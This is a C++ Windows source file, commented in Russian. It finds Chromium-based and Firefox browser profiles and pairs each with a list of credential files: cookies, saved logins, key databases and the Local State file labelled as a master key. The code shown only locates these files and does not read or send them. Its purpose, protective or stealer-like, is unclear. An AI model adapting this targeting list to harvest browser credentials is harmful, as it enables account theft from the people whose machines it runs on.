#include "browser_paths.h"
#include <windows.h>
#include <shlobj.h>
#include <filesystem>

namespace fs = std::filesystem;

// Чувствительные файлы в профиле браузера (Chromium-based)
static const std::vector<std::wstring> CHROMIUM_SENSITIVE = {
    L"Cookies",
    L"Cookies-journal",
    L"Login Data",
    L"Login Data-journal",
    L"Web Data",
    L"Web Data-journal",
    L"Local State",
    L"History",
    L"Bookmarks",
    L"Preferences",
    L"Sessions",
    L"Current Session",
    L"Current Tabs",
    L"Last Session",
    L"Last Tabs",
    L"Extension Cookies",
    L"Extension Cookies-journal",
    L"Network\\Cookies",
    L"Network\\Cookies-journal",
};

// Чувствительные файлы Firefox
static const std::vector<std::wstring> FIREFOX_SENSITIVE = {
    L"cookies.sqlite",
    L"cookies.sqlite-wal",
    L"logins.json",
    L"key4.db",
    L"key3.db",
    L"cert9.db",
    L"signons.sqlite",
    L"formhistory.sqlite",
    L"places.sqlite",
    L"sessionstore.jsonlz4",
    L"recovery.jsonlz4",
};

static std::wstring get_local_appdata() {
    wchar_t path[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) == S_OK) {
        return path;
    }
    return L"";
}

static std::wstring get_appdata() {
    wchar_t path[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path) == S_OK) {
        return path;
    }
    return L"";
}

static void add_chromium_profile(
    std::vector<BrowserProfile>& profiles,
    const std::wstring& name,
    const std::wstring& base_path
) {
    if (!fs::exists(base_path)) return;

    // Default profile
    std::wstring default_path = base_path + L"\\Default";
    if (fs::exists(default_path)) {
        BrowserProfile p;
        p.browser_name = name;
        p.profile_path = default_path;
        p.sensitive_files = CHROMIUM_SENSITIVE;
        profiles.push_back(p);
    }

    // Numbered profiles (Profile 1, Profile 2, ...)
    try {
        for (auto& entry : fs::directory_iterator(base_path)) {
            std::wstring dirname = entry.path().filename().wstring();
            if (dirname.find(L"Profile ") == 0 && fs::is_directory(entry)) {
                BrowserProfile p;
                p.browser_name = name + L" (" + dirname + L")";
                p.profile_path = entry.path().wstring();
                p.sensitive_files = CHROMIUM_SENSITIVE;
                profiles.push_back(p);
            }
        }
    } catch (...) {}

    // Local State (в корне user data)
    if (fs::exists(base_path + L"\\Local State")) {
        BrowserProfile p;
        p.browser_name = name + L" [Master Key]";
        p.profile_path = base_path;
        p.sensitive_files = { L"Local State" };
        profiles.push_back(p);
    }
}

std::vector<BrowserProfile> discover_browser_profiles() {
    std::vector<BrowserProfile> profiles;
    std::wstring local = get_local_appdata();
    std::wstring roaming = get_appdata();

    if (local.empty()) return profiles;

    // Chrome
    add_chromium_profile(profiles, L"Chrome",
        local + L"\\Google\\Chrome\\User Data");

    // Edge
    add_chromium_profile(profiles, L"Edge",
        local + L"\\Microsoft\\Edge\\User Data");

    // Opera
    add_chromium_profile(profiles, L"Opera",
        roaming + L"\\Opera Software\\Opera Stable");

    // Opera GX
    add_chromium_profile(profiles, L"Opera GX",
        roaming + L"\\Opera Software\\Opera GX Stable");

    // Brave
    add_chromium_profile(profiles, L"Brave",
        local + L"\\BraveSoftware\\Brave-Browser\\User Data");

    // Yandex Browser
    add_chromium_profile(profiles, L"Yandex Browser",
        local + L"\\Yandex\\YandexBrowser\\User Data");

    // Vivaldi
    add_chromium_profile(profiles, L"Vivaldi",
        local + L"\\Vivaldi\\User Data");

    // Firefox
    std::wstring firefox_base = roaming + L"\\Mozilla\\Firefox\\Profiles";
    if (fs::exists(firefox_base)) {
        try {
            for (auto& entry : fs::directory_iterator(firefox_base)) {
                if (fs::is_directory(entry)) {
                    BrowserProfile p;
                    p.browser_name = L"Firefox (" + entry.path().filename().wstring() + L")";
                    p.profile_path = entry.path().wstring();
                    p.sensitive_files = FIREFOX_SENSITIVE;
                    profiles.push_back(p);
                }
            }
        } catch (...) {}
    }

    return profiles;
}
